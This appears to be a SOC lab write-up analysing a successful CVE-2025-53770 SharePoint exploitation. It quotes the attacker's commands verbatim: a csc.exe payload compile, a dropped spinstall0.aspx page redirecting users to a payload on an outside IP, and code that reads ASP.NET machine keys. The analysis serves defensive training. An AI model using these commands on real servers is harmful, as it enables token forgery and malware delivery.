---
title: CVE‑2025‑53770 SharePoint
description: CVE‑2025‑53770 SharePoint
date: 2025-07-26
summary: A look at a SOC alert for CVE‑2025‑53770 SharePoint
categories:
  - Labs
  - LetsDefend
  - SOC Labs
---
![featured.jpg](featured.jpg)

# CVE‑2025‑53770
*Source: [SANS](https://www.sans.org/blog/critical-sharepoint-zero-day-exploited-what-you-need-to-know-about-cve-2025-53770), [CISA](https://www.cisa.gov/news-events/alerts/2025/07/20/update-microsoft-releases-guidance-exploitation-sharepoint-vulnerabilities), [LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/Csc/)*

## What is the vulnerability?

**CVE‑2025‑53770 | SharePoint vulnerability**
<br>Affects on-prem instances (2016, 2019, Subscription editions). It bypasses authentication to facilitate the following: upload files, execute a web shell, and steal the machineKey. It works by exploiting ToolPane.aspx via a spoofed referrer header (SignOut.aspx).
## What is the alert?

![alert.png](images/alert.png)

>**Alert Trigger Reason**: *Suspicious unauthenticated POST request targeting ToolPane.aspx with large payload size and spoofed referer indicative of CVE-2025-53770 exploitation.*

It looks like the exploitation has been successful. We can see an unauthenticated POST request against ToolPane.aspx, and Signout.aspx in the referrer header. A large payload size to note here.


>**Source IP Address:** 107.191.58.76
- This IP looks to be associated with the vulnerability, in the wild.

![ipinfo.png](images/ipinfo.png)

## Summary
We have a true positive exploit of CVE‑2025‑53770. The adversary has successfully exploited the vulnerability and post-exploitation phase is evident. 

w3wp.exe was used to spawn an encoded powershell script. This script facilitated the extract of the ASP.NET MachineKey. LOTL was observed, with csc.exe being used to compile a malicious *payload.exe*. A malicious page *spinstall0.aspx* was created which redirects users to the adversary's *payload.exe*

## Analysing the endpoint
![endpoint.png](images/endpoint.png)
> OS: Windows Server 2019

-  We are vulnerable.


## Timeline

| Time     | Process        | Overview                                               | Child Process  |
| -------- | -------------- | ------------------------------------------------------ | -------------- |
| 13:07:11 | w3wp.exe       | Process that supports SharePoint                       | powershell.exe |
| 13:07:24 | powershell.exe | Run Base64 code (Code 1).                              | csc.exe        |
| 13:07:27 | csc.exe        | Compile payload.cs as payload.exe (Code 2)             | cmd.exe        |
| 13:07:29 | cmd.exe        | Write malicious spinstall0.aspx to SharePoint (Code 3) | powershell.exe |
| 13:07:34 | powershell.exe | Gather machine key (Code 4)                            |                |

### Terminal History
![terminal.png](images/terminal.png)

There is a bit to unpack here lets start with item 1.

#### Code 1
Flags: 
`-nop, -w hidden, -e`
- No profile
- Hide the PowerShell window
- EncodedCommand

After decoding the Base64 commands we get:
![decoded.png](images/decoded.png)

It looks like we are looking at an exfiltration script.

We can gather the following:
```
%@ Import Namespace="System.Diagnostics" %
%@ Import Namespace="System.IO" %
script runat="server" language="c#"
```

- Server side C# execution
- ASP.NET 

``` 
var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
Response.Write(cg.ValidationKey+"|"+cg.Validation+"|"+cg.DecryptionKey+"|"+cg.Decryption+"|"+cg.CompatibilityMode);
```

- Gathers and outputs machine keys from Web.Configuration
	- ValidationKey
	- DecryptionKey
- These crypto keys are used to authenticate user sessions
	- Now the adversary can forge valid auth. tokens 

#### Code 2
```
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
```

- csc.exe is a binary file used by .NET to compile C#, this is a LOTL
- Malicious code payload.cs is compiled as payload.exe

#### Code 3
```
"C:\Windows\System32\cmd.exe" /c echo <form runat=\"server\"> <object classid=\"clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11\"><param name=\"Command\" value=\"Redirect\"> <param name=\"Button\" value=\"Test\"> <param name=\"Url\" value=\"http://107.191.58.76/payload.exe\"></object></form> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx`
```

- Run command via cmd
- Drop redirector page spinstall0.aspx to SharePoint Layouts directory
- This triggers a redirect to download payload.exe from adversary's infrastructure

#### Code 4
```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"
```
- Use Powershell to gather Machine Key






